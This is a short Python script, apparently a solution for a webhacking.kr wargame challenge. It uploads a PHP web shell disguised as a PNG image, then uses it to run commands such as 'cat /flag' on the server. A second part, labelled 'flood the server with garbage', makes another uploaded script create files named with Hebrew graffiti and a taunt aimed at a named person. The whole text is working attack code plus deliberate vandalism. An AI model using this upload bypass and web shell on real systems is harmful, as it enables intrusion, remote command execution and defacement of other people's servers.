import requests

URL = "http://webhacking.kr:10004/index.php"
SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
headers = {'Cookie': 'PHPSESSID='+SESSION_ID, 'Content-Type': 'image/png'}
files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
response = requests.post(URL, headers=headers, files=files)
print(response.text)

# flood the server with garbage
URL = "http://webhacking.kr:10004/upload/coolCode.php?x=touch "
CHALLENGE   = 'http://webhacking.kr:10004/upload/bla.php?cmd=cat /flag'
headers     = {'Cookie':'PHPSESSID='+SESSION_ID}
messages = ["ווסאן היה כאן\n",
            "#הייתי פה\n",
            "יאללה יתמ\"\nל",
            "חח, צחוקים\n",
            "\nפרידמן יא אפס"]
for m in messages:
    req = requests.get(URL+m, headers=headers)
    # print(req.text)